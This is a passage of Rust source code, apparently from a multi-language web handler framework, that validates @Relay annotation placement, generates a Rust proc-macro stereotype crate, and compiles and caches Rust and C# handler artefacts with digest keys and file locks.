        .filter_map(|keyword| {
            find_code_word(source, keyword, declaration_start, code)
                .filter(|at| *at < declaration_end)
                .map(|at| (keyword, at))
        })
        .min_by_key(|(_, at)| *at)
    else {
        return;
    };
    let mut name_start = declaration + keyword.len();
    while name_start < declaration_end
        && (source.as_bytes()[name_start].is_ascii_whitespace()
            || code.get(name_start) != Some(&true))
    {
        name_start += 1;
    }
    let name_end = (name_start..declaration_end)
        .find(|at| {
            code.get(*at) != Some(&true)
                || (!source.as_bytes()[*at].is_ascii_alphanumeric()
                    && source.as_bytes()[*at] != b'_')
        })
        .unwrap_or(declaration_end);
    if name_start == name_end {
        return;
    }
    let name = &source[name_start..name_end];
    // Relay owners use an inherent, direct `impl Name { ... }`. Generic,
    // qualified, and trait impl targets are intentionally not inferred: a
    // source that needs one must expose a direct delegate method instead.
    let mut cursor = declaration_start;
    while let Some(at) = find_code_word(source, "impl", cursor, code) {
        let mut target_start = at + "impl".len();
        while source
            .as_bytes()
            .get(target_start)
            .is_some_and(u8::is_ascii_whitespace)
        {
            target_start += 1;
        }
        let target_end = source.as_bytes()[target_start..]
            .iter()
            .position(|byte| !byte.is_ascii_alphanumeric() && *byte != b'_')
            .map_or(source.len(), |offset| target_start + offset);
        let mut open = target_end;
        while source
            .as_bytes()
            .get(open)
            .is_some_and(u8::is_ascii_whitespace)
        {
            open += 1;
        }
        cursor = target_end.max(at + "impl".len());
        if &source[target_start..target_end] != name
            || source.as_bytes().get(open) != Some(&b'{')
            || code.get(open) != Some(&true)
        {
            continue;
        }
        if let Some(close) = matching_delimiter(source, open, b'{', b'}', code) {
            scopes.push(RelayScope {
                delegate: true,
                open,
                close,
            });
            cursor = close + 1;
        } else {
            break;
        }
    }
}

fn python_delegate_ranges(source: &str, code: &[bool]) -> Vec<RelayScope> {
    let mut scopes = Vec::new();
    for (layer, delegate) in layer_spellings("py") {
        let mut cursor = 0;
        while let Some(annotation) = find_annotation_marker(source, layer, cursor, code) {
            let line_end = source[annotation..]
                .find('\n')
                .map_or(source.len(), |offset| annotation + offset + 1);
            let Some(class_at) = find_code_marker_ascii_case(source, "class ", line_end, code)
            else {
                break;
            };
            let line_start = source[..class_at].rfind('\n').map_or(0, |at| at + 1);
            let indent = source[line_start..class_at].len();
            let mut close = source.len();
            let mut at = source[class_at..]
                .find('\n')
                .map_or(source.len(), |offset| class_at + offset + 1);
            while at < source.len() {
                let end = source[at..]
                    .find('\n')
                    .map_or(source.len(), |offset| at + offset);
                let line = &source[at..end];
                if !line.trim().is_empty()
                    && !line.trim_start().starts_with('#')
                    && line.len() - line.trim_start().len() <= indent
                {
                    close = at;
                    break;
                }
                at = end.saturating_add(1);
            }
            scopes.push(RelayScope {
                delegate,
                open: class_at,
                close,
            });
            cursor = line_end;
        }
    }
    scopes
}

fn relay_precedes_method(
    extension: &str,
    source: &str,
    annotation: usize,
    owner_close: usize,
    code: &[bool],
) -> bool {
    let marker = relay_marker(extension);
    let Some(arguments_end) =
        matching_delimiter(source, annotation + marker.len() - 1, b'(', b')', code)
    else {
        return false;
    };
    let mut start = arguments_end + 1;
    while source
        .as_bytes()
        .get(start)
        .is_some_and(u8::is_ascii_whitespace)
        || matches!(source.as_bytes().get(start), Some(b']'))
    {
        start += 1;
    }
    let method_word = match extension {
        "py" => Some("def"),
        "kt" => Some("fun"),
        "php" => Some("function"),
        "rs" => Some("fn"),
        _ => None,
    };
    if let Some(word) = method_word {
        let Some(method) = find_code_word(source, word, start, code).filter(|at| *at < owner_close)
        else {
            return false;
        };
        if extension == "py" {
            let indentation = |at: usize| {
                let line = source[..at].rfind('\n').map_or(0, |line| line + 1);
                source[line..at].len() - source[line..at].trim_start().len()
            };
            if indentation(annotation) != indentation(method) {
                return false;
            }
        }
        if has_declaration_boundary(source, start, method, code)
            || has_intervening_declaration_line(source, start, method, code)
        {
            return false;
        }
        let Some(parameters) =
            find_code_byte(source, method + word.len(), b'(', code).filter(|at| *at < owner_close)
        else {
            return false;
        };
        return !has_declaration_boundary(source, method + word.len(), parameters, code);
    }
    loop {
        let Some(parameters) =
            find_code_byte(source, start, b'(', code).filter(|at| *at < owner_close)
        else {
            return false;
        };
        if has_declaration_boundary(source, start, parameters, code)
            || has_intervening_declaration_line(source, start, parameters, code)
        {
            return false;
        }
        let before = &source.as_bytes()[start..parameters];
        let Some(name_end) = before.iter().rposition(|byte| !byte.is_ascii_whitespace()) else {
            return false;
        };
        let name_start = before[..=name_end]
            .iter()
            .rposition(|byte| !byte.is_ascii_alphanumeric() && *byte != b'_')
            .map_or(0, |at| at + 1);
        if name_start > 0 && matches!(before.get(name_start - 1), Some(b'@' | b'[' | b'#')) {
            let Some(close) = matching_delimiter(source, parameters, b'(', b')', code) else {
                return false;
            };
            start = close + 1;
            continue;
        }
        return name_start <= name_end;
    }
}

fn has_intervening_declaration_line(
    source: &str,
    from: usize,
    declaration: usize,
    code: &[bool],
) -> bool {
    let declaration_line = source[..declaration].rfind('\n').map_or(from, |at| at + 1);
    if declaration_line <= from {
        return false;
    }
    source[from..declaration_line]
        .split_inclusive('\n')
        .scan(from, |offset, line| {
            let start = *offset;
            *offset += line.len();
            let visible: String = line
                .bytes()
                .enumerate()
                .filter_map(|(at, byte)| {
                    (code.get(start + at) == Some(&true)).then_some(char::from(byte))
                })
                .collect();
            Some(visible.trim().to_string())
        })
        .any(|line| {
            !line.is_empty()
                && !line.starts_with('@')
                && !line.starts_with("#[")
                && !line.starts_with('[')
        })
}

fn find_code_word(source: &str, word: &str, from: usize, code: &[bool]) -> Option<usize> {
    let mut cursor = from;
    while let Some(at) = find_code_marker(source, word, cursor, code) {
        let boundary = |byte: Option<&u8>| {
            byte.is_none_or(|value| !value.is_ascii_alphanumeric() && *value != b'_')
        };
        if boundary(
            at.checked_sub(1)
                .and_then(|before| source.as_bytes().get(before)),
        ) && boundary(source.as_bytes().get(at + word.len()))
        {
            return Some(at);
        }
        cursor = at + word.len();
    }
    None
}

fn has_declaration_boundary(source: &str, from: usize, before: usize, code: &[bool]) -> bool {
    source.as_bytes()[from..before]
        .iter()
        .enumerate()
        .any(|(offset, byte)| {
            code.get(from + offset) == Some(&true)
                && matches!(byte, b'=' | b';' | b'{' | b'}' | b':')
        })
        || ["class", "struct", "interface", "record", "const"]
            .into_iter()
            .any(|word| find_code_word(source, word, from, code).is_some_and(|at| at < before))
}

fn validate_relay_placement(source: &Path, contents: &str, portable: &str) -> Result<(), Failure> {
    let extension = source
        .extension()
        .map(|value| value.to_string_lossy().to_lowercase())
        .unwrap_or_default();
    let code = code_bytes(&extension, contents, portable)?;
    let marker = relay_marker(&extension);
    let scopes = if extension == "py" {
        python_delegate_ranges(contents, &code)
    } else {
        brace_relay_scopes(&extension, contents, &code)
    };
    let mut cursor = 0;
    while let Some(annotation) = find_code_marker(contents, marker, cursor, &code) {
        let owner = scopes
            .iter()
            .filter(|scope| scope.open < annotation && annotation < scope.close)
            .min_by_key(|scope| scope.close - scope.open);
        if !owner.is_some_and(|scope| scope.delegate)
            || !owner.is_some_and(|scope| {
                relay_precedes_method(&extension, contents, annotation, scope.close, &code)
            })
        {
            return Err(invalid_source(
                portable,
                "@Relay must annotate a method on the enclosing @Delegate class.",
            ));
        }
        cursor = annotation + marker.len();
    }
    Ok(())
}

fn relay_binding(extension: &str, parameters: &str) -> String {
    let first = parameters.split(',').next().unwrap_or_default().trim();
    if extension == "php" {
        return first
            .split_whitespace()
            .find(|part| part.starts_with('$'))
            .unwrap_or("$request")
            .trim_matches(|character: char| !character.is_alphanumeric() && character != '$')
            .to_string();
    }
    if extension == "kt" {
        return first
            .split(':')
            .next()
            .unwrap_or("request")
            .split_whitespace()
            .next_back()
            .unwrap_or("request")
            .to_string();
    }
    first
        .split_whitespace()
        .next_back()
        .unwrap_or("request")
        .trim_matches(|character: char| !character.is_alphanumeric() && character != '_')
        .to_string()
}

fn quoted_literals(source: &str) -> Vec<String> {
    let bytes = source.as_bytes();
    let mut literals = Vec::new();
    let mut at = 0;
    while at < bytes.len() {
        if bytes[at] != b'"' && bytes[at] != b'\'' {
            at += 1;
            continue;
        }
        let quote = bytes[at];
        let start = at;
        at += 1;
        while at < bytes.len() {
            if bytes[at] == b'\\' {
                at += 2;
            } else if bytes[at] == quote {
                at += 1;
                literals.push(String::from(&source[start..at]));
                break;
            } else {
                at += 1;
            }
        }
    }
    literals
}

fn matching_delimiter(
    source: &str,
    open: usize,
    left: u8,
    right: u8,
    code: &[bool],
) -> Option<usize> {
    let bytes = source.as_bytes();
    let mut depth = 0_u32;
    for (at, byte) in bytes.iter().copied().enumerate().skip(open) {
        if !code.get(at).copied().unwrap_or(false) {
            continue;
        }
        if byte == left {
            depth += 1;
        } else if byte == right {
            depth = depth.checked_sub(1)?;
            if depth == 0 {
                return Some(at);
            }
        }
    }
    None
}

/// The Rust stereotype crate, built once and cached beside the handlers.
///
/// A custom Rust attribute is a procedural macro, and a procedural macro needs
/// a crate — not a Cargo manifest. `rustc --crate-type=proc-macro` builds this
/// one from a single file in under a tenth of a second, and it is cached like
/// every other artefact, so the cost is paid once per project.
///
/// Each macro returns its item untouched: a stereotype states which layer a
/// type is in and must not alter it.
const RUST_STEREOTYPE_CRATE: &str = r#"// Rust lints a function name that is not snake case, and an attribute macro is
// a function. A stereotype is not one: it is a name shared across eight
// languages, and spelling it `controller` here and `Controller` everywhere
// else would make the reader carry a table. The lint is silenced rather than
// obeyed, deliberately — and an inner attribute has to lead the file, before
// even the `extern crate`.
#![allow(non_snake_case)]

extern crate proc_macro;
use proc_macro::TokenStream;

#[proc_macro_attribute]
pub fn Controller(_args: TokenStream, item: TokenStream) -> TokenStream { item }
#[proc_macro_attribute]
pub fn Service(_args: TokenStream, item: TokenStream) -> TokenStream { item }
#[proc_macro_attribute]
pub fn Repository(_args: TokenStream, item: TokenStream) -> TokenStream { item }
#[proc_macro_attribute]
pub fn Client(_args: TokenStream, item: TokenStream) -> TokenStream { item }
#[proc_macro_attribute]
pub fn Delegate(_args: TokenStream, item: TokenStream) -> TokenStream { item }

/// Marks a method as a proxy for a program Yon does not run.
///
/// The command is metadata about the method, so it belongs in the declaration
/// rather than in a body the reader has to open to find it. Rust is one of the
/// four languages here where the annotation can do the work itself: a proc
/// macro rewrites the body, so nothing has to intercept the call later.
#[proc_macro_attribute]
pub fn Relay(args: TokenStream, item: TokenStream) -> TokenStream {
    let command = args.to_string();
    if command.trim().is_empty() {
        return item;
    }
    // The signature is fixed by the protocol — `fn NAME(binding: &YonRequest)
    // -> YonResponse` — so the binding is read off it rather than assumed to be
    // called `request`. A handler that named it `req` still works.
    let text = item.to_string();
    let signature = match text.split_once('{') {
        Some((head, _)) => head.to_string(),
        None => return item,
    };
    let binding = signature
        .split_once('(')
        .and_then(|(_, rest)| rest.split_once(')'))
        .map(|(inside, _)| inside)
        .and_then(|inside| inside.split(':').next())
        .unwrap_or("request")
        .trim()
        .to_string();
    match format!("{signature} {{ relay(&[{command}], {binding}) }}").parse() {
        Ok(rewritten) => rewritten,
        Err(_) => item,
    }
}
"#;

/// Builds the stereotype crate in an owned temporary directory, publishes it
/// through the cache capability, and copies the hit into the caller's owned
/// compiler workspace.
fn stereotype_crate(
    cache: &CacheDirectory,
    compiler_workspace: &Path,
    portable: &str,
) -> Result<Vec<String>, Failure> {
    let digest = crate::compiler::hex_digest(Sha256::digest(RUST_STEREOTYPE_CRATE.as_bytes()));
    // The platform's own dynamic library prefix and suffix. Both matter: a proc
    // macro is a host artefact whatever the handler targets, and rustc refuses
    // an `--extern` whose file is not named the way that platform names a
    // library — "extern location is of an unknown type" is what a missing `lib`
    // gets you.
    let library_name = format!(
        "{}tachyon_stereotypes-{digest}{}",
        std::env::consts::DLL_PREFIX,
        std::env::consts::DLL_SUFFIX
    );
    let library = Path::new(&library_name);
    if !cache.is_valid_file(library) {
        let lock_prefix = library_name
            .strip_suffix(std::env::consts::DLL_SUFFIX)
            .unwrap_or(&library_name);
        let _lock = cache
            .acquire_lock(Path::new(&format!("{lock_prefix}.lock")), COMPILER_DEADLINE)
            .map_err(|error| {
                cache_failure(portable, "Cannot coordinate stereotype cache", error)
            })?;
        if !cache.is_valid_file(library) {
            if cache.metadata(library).is_ok() {
                return Err(invalid_source(
                    portable,
                    "The stereotype cache output is not a valid regular file.",
                ));
            }
            let build = tempfile::Builder::new()
                .prefix("tachyon-stereotype-build-")
                .tempdir()
                .map_err(|error| {
                    invalid_source(
                        portable,
                        &format!("Cannot create stereotype compiler workspace: {error}"),
                    )
                })?;
            let source = build.path().join("tachyon_stereotypes.rs");
            write_compiler_file(&source, RUST_STEREOTYPE_CRATE.as_bytes(), portable)?;
            let output = build
                .path()
                .join(format!("output{}", std::env::consts::DLL_SUFFIX));
            run_compiler(
                "rustc",
                &[
                    String::from("--edition"),
                    String::from("2024"),
                    String::from("--crate-type=proc-macro"),
                    String::from("--crate-name"),
                    String::from("tachyon_stereotypes"),
                    source.to_string_lossy().into_owned(),
                    String::from("-o"),
                    output.to_string_lossy().into_owned(),
                ],
                portable,
            )?;
            if !valid_owned_artifact(&output) {
                return Err(invalid_source(
                    portable,
                    "The stereotype compiler did not produce a regular artifact.",
                ));
            }
            cache.publish_file(&output, library).map_err(|error| {
                cache_failure(portable, "Cannot safely publish stereotype artifact", error)
            })?;
        }
    }
    if !cache.is_valid_file(library) {
        return Err(invalid_source(
            portable,
            "The stereotype cache output is not a valid regular file.",
        ));
    }
    let runtime_library = compiler_workspace.join(&library_name);
    cache
        .copy_file_out(library, &runtime_library)
        .map_err(|error| cache_failure(portable, "Cannot copy stereotype artifact", error))?;
    if !valid_owned_artifact(&runtime_library) {
        return Err(invalid_source(
            portable,
            "The copied stereotype artifact is invalid.",
        ));
    }
    Ok(vec![
        String::from("--extern"),
        format!("tachyon_stereotypes={}", runtime_library.to_string_lossy()),
    ])
}

/// Builds one handler and returns the command that runs the result.
///
/// The artefact is keyed on the source digest, so an unchanged handler is
/// compiled once and every later request reuses it. A changed handler gets a
/// new key rather than overwriting the old artefact, which keeps a running
/// server from executing a half-written file.
#[allow(clippy::too_many_lines)] // Cache publication and compiler lifecycle stay one transaction.
fn compile_handler(
    compiler: &Compiler,
    source: &Path,
    bytes: &[u8],
    portable: &str,
    cache: &CacheDirectory,
) -> Result<PreparedCommand, Failure> {
    let extension = source
        .extension()
        .map(|value| value.to_string_lossy().to_lowercase())
        .unwrap_or_default();
    let authored =
        materialize_compiled_relays(&extension, &String::from_utf8_lossy(bytes), portable)?;
    let protocol = protocol_prelude(&extension, &authored);
    let digest = compiled_digest(
        authored.as_bytes(),
        protocol.as_bytes(),
        &compiler_identity(compiler.compile[0]),
        std::env::consts::ARCH,
        std::env::consts::OS,
    );
    let artefact = PathBuf::from(format!("{digest}{}", compiler.suffix));

    // The annotations the handler declares its layer with, and the protocol it
    // answers through, in the one source file the compiler is given. Staged
    // only when the language needs it, so a handler that needs neither is
    // compiled from where it was written.
    let prelude = stereotype_prelude(&extension);
    // The protocol supplies `main`, so a handler that writes its own collides
    // with it. rustc reports that as "the name `main` is defined multiple
    // times", which says nothing about why a handler should not have one.
    if !protocol.is_empty() && has_own_entry_point(bytes) {
        return Err(invalid_source(
            portable,
            "A handler declares its methods and nothing else: `fn main` is supplied by Yon, \
             which reads the request, calls the method named in it and writes the response. \
             Move the body of `main` into `fn GET(request: &YonRequest) -> YonResponse` and \
             delete it.",
        ));
    }
    let mut compiled_source = Vec::from(prelude.as_bytes());
    compiled_source.extend_from_slice(authored.as_bytes());
    compiled_source.push(b'\n');
    compiled_source.extend_from_slice(protocol.as_bytes());

    if !cache.is_valid_file(&artefact) {
        let prune_lock = cache
            .acquire_lock(Path::new(".prune.lock"), COMPILER_DEADLINE)
            .map_err(|error| cache_failure(portable, "Cannot coordinate cache pruning", error))?;
        let digest_lock = cache
            .acquire_lock(Path::new(&format!("{digest}.lock")), COMPILER_DEADLINE)
            .map_err(|error| {
                cache_failure(portable, "Cannot coordinate handler compilation", error)
            })?;
        cache.prune().map_err(|error| {
            cache_failure(portable, "Cannot enforce the handler cache bounds", error)
        })?;
        drop(prune_lock);
        if !cache.is_valid_file(&artefact) {
            match cache.metadata(&artefact) {
                Ok(metadata) if metadata.is_symlink() || !metadata.is_file() => {
                    return Err(invalid_source(
                        portable,
                        "A handler artifact cache child is a symlink or unsupported type.",
                    ));
                }
                Ok(metadata) if metadata.len() == 0 => {
                    cache.remove(&artefact).map_err(|error| {
                        cache_failure(portable, "Cannot remove incomplete handler artifact", error)
                    })?;
                }
                Ok(_) => {
                    return Err(invalid_source(
                        portable,
                        "A handler artifact failed cache validation.",
                    ));
                }
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
                Err(error) => {
                    return Err(cache_failure(
                        portable,
                        "Cannot inspect handler artifact",
                        error,
                    ));
                }
            }
            let build = tempfile::Builder::new()
                .prefix("tachyon-handler-build-")
                .tempdir()
                .map_err(|error| {
                    invalid_source(
                        portable,
                        &format!("Cannot create compiler workspace: {error}"),
                    )
                })?;
            let source_name = source
                .file_name()
                .and_then(|value| value.to_str())
                .unwrap_or("handler");
            let staged = build.path().join(source_name);
            write_compiler_file(&staged, &compiled_source, portable)?;
            let output = build.path().join(format!("output{}", compiler.suffix));
            let mut arguments: Vec<String> = compiler.compile[1..]
                .iter()
                .map(|part| {
                    part.replace("{out}", &output.to_string_lossy())
                        .replace("{src}", &staged.to_string_lossy())
                })
                .collect();
            if extension == "rs" {
                arguments.extend(stereotype_crate(cache, build.path(), portable)?);
            }
            run_compiler(compiler.compile[0], &arguments, portable)?;
            if !valid_owned_artifact(&output) {
                return Err(invalid_source(
                    portable,
                    "Compiler completed without producing a valid handler artifact.",
                ));
            }
            cache.publish_file(&output, &artefact).map_err(|error| {
                cache_failure(portable, "Cannot publish the handler artifact", error)
            })?;
        }
        drop(digest_lock);
    }

    let prune_lock = cache
        .acquire_lock(Path::new(".prune.lock"), COMPILER_DEADLINE)
        .map_err(|error| cache_failure(portable, "Cannot coordinate cache pruning", error))?;
    let digest_lock = cache
        .acquire_lock(Path::new(&format!("{digest}.lock")), COMPILER_DEADLINE)
        .map_err(|error| {
            cache_failure(portable, "Cannot coordinate handler cache access", error)
        })?;
    drop(digest_lock);
    cache.prune().map_err(|error| {
        cache_failure(portable, "Cannot enforce the handler cache bounds", error)
    })?;
    let digest_lock = cache
        .acquire_lock(Path::new(&format!("{digest}.lock")), COMPILER_DEADLINE)
        .map_err(|error| {
            cache_failure(portable, "Cannot coordinate handler cache access", error)
        })?;
    drop(prune_lock);
    if !cache.is_valid_file(&artefact) {
        return Err(invalid_source(
            portable,
            "The compiled handler cannot fit within the 512 MiB / 256-entry cache quota.",
        ));
    }

    let workspace = RuntimeWorkspace::new(portable)?;
    let runtime_artifact = workspace.path().join(format!("handler{}", compiler.suffix));
    cache
        .copy_file_out(&artefact, &runtime_artifact)
        .map_err(|error| cache_failure(portable, "Cannot copy cached handler artifact", error))?;
    if !valid_owned_artifact(&runtime_artifact) {
        return Err(invalid_source(
            portable,
            "The runtime handler artifact is invalid.",
        ));
    }
    drop(digest_lock);
    let mut interpreter: Vec<String> = compiler
        .run
        .iter()
        .map(|part| String::from(*part))
        .collect();
    interpreter.push(runtime_artifact.to_string_lossy().into_owned());
    Ok(PreparedCommand {
        interpreter,
        workspace,
    })
}

fn compiled_digest(
    source: &[u8],
    protocol: &[u8],
    compiler: &str,
    architecture: &str,
    operating_system: &str,
) -> String {
    let mut keyed = Vec::from(source);
    keyed.extend_from_slice(protocol);
    keyed.extend_from_slice(compiler.as_bytes());
    keyed.extend_from_slice(architecture.as_bytes());
    keyed.extend_from_slice(operating_system.as_bytes());
    crate::compiler::hex_digest(Sha256::digest(&keyed))
}

fn valid_owned_artifact(path: &Path) -> bool {
    fs::symlink_metadata(path).is_ok_and(|metadata| {
        metadata.is_file() && !metadata.file_type().is_symlink() && metadata.len() > 0
    })
}

fn write_compiler_file(path: &Path, bytes: &[u8], portable: &str) -> Result<(), Failure> {
    let mut file = fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(path)
        .map_err(|error| {
            invalid_source(
                portable,
                &format!("Cannot create owned compiler file: {error}"),
            )
        })?;
    file.write_all(bytes)
        .and_then(|()| file.flush())
        .and_then(|()| file.sync_all())
        .map_err(|error| {
            invalid_source(
                portable,
                &format!("Cannot durably write compiler file: {error}"),
            )
        })?;
    Ok(())
}

const CSHARP_RUNTIME_FILES: [&str; 3] = [
    "handler.dll",
    "handler.deps.json",
    "handler.runtimeconfig.json",
];

fn valid_csharp_cache(cache: &CacheDirectory, digest: &str, expected_metadata: &str) -> bool {
    let directory = Path::new(digest);
    cache
        .metadata(directory)
        .is_ok_and(|metadata| metadata.is_dir() && !metadata.is_symlink())
        && CSHARP_RUNTIME_FILES
            .iter()
            .all(|name| cache.is_valid_file(&directory.join("out").join(name)))
        && cache
            .read_to_string(&directory.join(".complete"))
            .is_ok_and(|metadata| metadata == expected_metadata)
}

fn valid_csharp_build(output: &Path) -> bool {
    CSHARP_RUNTIME_FILES
        .iter()
        .all(|name| valid_owned_artifact(&output.join(name)))
}

fn compiler_identity(program: &str) -> String {
    let argument = if program.contains("kotlinc") {
        "-version"
    } else {
        "--version"
    };
    bounded_compiler_output(program, &[String::from(argument)], None).map_or_else(
        |_| String::from(program),
        |output| {
            let bytes = if output.stdout.is_empty() {
                output.stderr
            } else {
                output.stdout
            };
            format!("{program}:{}", String::from_utf8_lossy(&bytes).trim())
        },
    )
}

/// Keys one built C# assembly on its source *and* the framework it was built
/// against.
///
/// The framework belongs in the key because it is part of what was built. An
/// assembly pins `<TargetFramework>` to the newest .NET major installed when it
/// was compiled, so keying on the source alone makes every artefact built
/// before a .NET upgrade a cache hit that cannot start — and it says so as
/// "You must install or update .NET to run this application", which describes
/// the machine rather than the stale artefact.
///
/// Reproduced by reporting a different major from `dotnet --list-runtimes`
/// between two builds of the same handler: before this, both resolved to one
/// digest and the second reused an assembly built for the first.
fn csharp_digest(source: &[u8], framework: &str) -> String {
    let mut keyed = Vec::from(source);
    keyed.extend_from_slice(framework.as_bytes());
    crate::compiler::hex_digest(Sha256::digest(&keyed))
}

/// Builds one C# handler through a generated project.
///
/// C# is the one language here that cannot be compiled from a bare source
/// path: `dotnet` wants a project, and the file-based `dotnet run app.cs` form
/// needs .NET 10. Generating the project is what keeps that an implementation
/// detail rather than a file the developer has to write and keep in step.
#[allow(clippy::too_many_lines)] // Generated project publication is one cache transaction.
fn compile_csharp(
    bytes: &[u8],
    portable: &str,
    cache: &CacheDirectory,
) -> Result<PreparedCommand, Failure> {
    // Targeting the newest installed runtime, because a project pinned to a
    // framework the machine does not have builds and then refuses to start.
    //
    // Resolved before the cache is consulted, because the answer is part of
    // what was built rather than a detail of building it.
    let listed = bounded_compiler_output("dotnet", &[String::from("--list-runtimes")], None)
        .map_err(|error| {
            invalid_source(
                portable,
                &format!("Compiling a C# handler needs 'dotnet': {error}"),
            )
        })?;
    let framework = String::from_utf8_lossy(&listed.stdout)
        .lines()
        .filter_map(|line| line.strip_prefix("Microsoft.NETCore.App "))
        .filter_map(|rest| rest.split('.').next())
        .filter_map(|major| major.parse::<u32>().ok())
        .max()
        .map(|major| format!("net{major}.0"))
        .ok_or_else(|| {
            invalid_source(portable, "No .NET runtime is installed for a C# handler.")
        })?;

    let authored = materialize_compiled_relays("cs", &String::from_utf8_lossy(bytes), portable)?;
    let protocol = protocol_prelude("cs", &authored);
    let mut keyed = authored.as_bytes().to_vec();
    keyed.extend_from_slice(protocol.as_bytes());
    keyed.extend_from_slice(compiler_identity("dotnet").as_bytes());
    keyed.extend_from_slice(std::env::consts::ARCH.as_bytes());
    keyed.extend_from_slice(std::env::consts::OS.as_bytes());
    let digest = csharp_digest(&keyed, &framework);
    let cache_metadata = format!("digest={digest}\nframework={framework}\n");
    if valid_csharp_cache(cache, &digest, &cache_metadata) {
        return prepare_csharp_runtime(cache, &digest, &cache_metadata, portable);
    }
    let prune_lock = cache
        .acquire_lock(Path::new(".prune.lock"), COMPILER_DEADLINE)
        .map_err(|error| cache_failure(portable, "Cannot coordinate cache pruning", error))?;
    let digest_lock = cache
        .acquire_lock(Path::new(&format!("{digest}.lock")), COMPILER_DEADLINE)
        .map_err(|error| cache_failure(portable, "Cannot coordinate C# compilation", error))?;
    cache.prune().map_err(|error| {
        cache_failure(portable, "Cannot enforce the handler cache bounds", error)
    })?;
    drop(prune_lock);
    if valid_csharp_cache(cache, &digest, &cache_metadata) {
        drop(digest_lock);
        return prepare_csharp_runtime(cache, &digest, &cache_metadata, portable);
    }
    let directory = Path::new(&digest);
    if let Ok(metadata) = cache.metadata(directory) {
        if metadata.is_symlink() || !metadata.is_dir() {
            return Err(invalid_source(
                portable,
                "The C# cache entry is a symlink or unsupported type.",
            ));
        }
        cache.remove(directory).map_err(|error| {
            cache_failure(
                portable,
                "Cannot remove an incomplete C# cache entry",
                error,
            )
        })?;
    }
    let build = tempfile::Builder::new()
        .prefix("tachyon-csharp-build-")
        .tempdir()
        .map_err(|error| {
            invalid_source(
                portable,
                &format!("Cannot create C# compiler workspace: {error}"),
            )
        })?;
    write_compiler_file(
        &build.path().join("handler.cs"),
        authored.as_bytes(),
        portable,
    )?;
    // The protocol is a second source rather than an append: a C# handler
    // already builds through a generated project, and a project takes as many
    // files as it likes.
    write_compiler_file(&build.path().join("yon.cs"), protocol.as_bytes(), portable)?;
    let project = format!(
        "<Project Sdk=\"Microsoft.NET.Sdk\">\n  <PropertyGroup>\n    \
             <OutputType>Exe</OutputType>\n    \
             <TargetFramework>{framework}</TargetFramework>\n    \
             <AssemblyName>handler</AssemblyName>\n    \
             <Nullable>disable</Nullable>\n    \
             <EnableDefaultCompileItems>false</EnableDefaultCompileItems>\n    \
             <ImplicitUsings>enable</ImplicitUsings>\n  \
             </PropertyGroup>\n  <ItemGroup><Compile Include=\"handler.cs\" />\
             <Compile Include=\"yon.cs\" /></ItemGroup>\n\
             </Project>\n"
    );
    write_compiler_file(
        &build.path().join("handler.csproj"),
        project.as_bytes(),
        portable,
    )?;

    let output = bounded_compiler_output(
        "dotnet",
        &["build", "-c", "Release", "-o", "out", "--nologo", "-v", "q"].map(String::from),
        Some(build.path()),
    )
    .map_err(|error| invalid_source(portable, &format!("Cannot start 'dotnet': {error}")))?;
    if output.overflow {
        return Err(invalid_source(
            portable,
            "Compiler output exceeded the 1 MiB diagnostic limit.",
        ));
    }
    if !output.status.success() {
        let detail = String::from_utf8_lossy(&output.stdout);
        return Err(invalid_source(
            portable,
            &format!(
                "Handler failed to compile: {}",
                detail
                    .lines()
                    .find(|line| line.contains("error"))
                    .unwrap_or("no detail")
                    .trim()
            ),
        ));
    }
    let build_output = build.path().join("out");
    if !valid_csharp_build(&build_output) {
        return Err(invalid_source(
            portable,
            "Compiler completed without producing the complete C# runtime artifact set.",
        ));
    }
    publish_csharp_cache(cache, &digest, &build_output, &cache_metadata, portable)?;
    drop(digest_lock);
    prepare_csharp_runtime(cache, &digest, &cache_metadata, portable)
}

fn publish_csharp_cache(
    cache: &CacheDirectory,
    digest: &str,
    build_output: &Path,
    metadata: &str,
    portable: &str,
) -> Result<(), Failure> {
    let directory = Path::new(digest);
    let mut owned = cache
        .create_owned_directory(directory)
        .map_err(|error| cache_failure(portable, "Cannot reserve C# cache entry", error))?;
    cache
        .create_directory(&directory.join("out"))
        .map_err(|error| cache_failure(portable, "Cannot create C# cache output", error))?;
    for name in CSHARP_RUNTIME_FILES {
        cache
            .publish_file(&build_output.join(name), &directory.join("out").join(name))
            .map_err(|error| {
                cache_failure(portable, "Cannot publish C# runtime artifact", error)
            })?;
    }
    cache
        .stage_bytes(&directory.join(".complete"), metadata.as_bytes())
        .map_err(|error| cache_failure(portable, "Cannot complete C# cache entry", error))?;
    owned.publish();
    Ok(())
}

fn prepare_csharp_runtime(
    cache: &CacheDirectory,
    digest: &str,
    expected_metadata: &str,
    portable: &str,
) -> Result<PreparedCommand, Failure> {
    let prune_lock = cache
        .acquire_lock(Path::new(".prune.lock"), COMPILER_DEADLINE)
        .map_err(|error| cache_failure(portable, "Cannot coordinate cache pruning", error))?;
    let digest_lock = cache
        .acquire_lock(Path::new(&format!("{digest}.lock")), COMPILER_DEADLINE)
        .map_err(|error| cache_failure(portable, "Cannot coordinate C# cache access", error))?;
    drop(digest_lock);
    cache.prune().map_err(|error| {
        cache_failure(portable, "Cannot enforce the handler cache bounds", error)
    })?;
    let digest_lock = cache
        .acquire_lock(Path::new(&format!("{digest}.lock")), COMPILER_DEADLINE)
        .map_err(|error| cache_failure(portable, "Cannot coordinate C# cache access", error))?;
    drop(prune_lock);
    if !valid_csharp_cache(cache, digest, expected_metadata) {
        return Err(invalid_source(
            portable,
            "The compiled C# handler cannot fit within the 512 MiB / 256-entry cache quota.",
        ));
    }
    let workspace = RuntimeWorkspace::new(portable)?;
    let output = workspace.path().join("out");
    fs::create_dir(&output).map_err(|error| {
        invalid_source(
            portable,
            &format!("Cannot create C# runtime output: {error}"),
        )
    })?;
    for name in CSHARP_RUNTIME_FILES {
        cache
            .copy_file_out(
                &Path::new(digest).join("out").join(name),
                &output.join(name),
            )
            .map_err(|error| cache_failure(portable, "Cannot copy C# runtime artifact", error))?;
    }
    if !valid_csharp_build(&output) {
        return Err(invalid_source(
            portable,
            "The copied C# runtime artifact set is invalid.",
        ));
    }
    drop(digest_lock);
    Ok(PreparedCommand {
        interpreter: vec![
            String::from("dotnet"),
            output.join("handler.dll").to_string_lossy().into_owned(),
        ],
        workspace,
    })
}

/// Whether a source defines its own entry point.
///
/// Textual, and deliberately loose: a `fn main` inside a string or a comment
/// would be caught too, which costs a false refusal on a handler nobody has
/// written and saves the real one from a duplicate-symbol error that explains
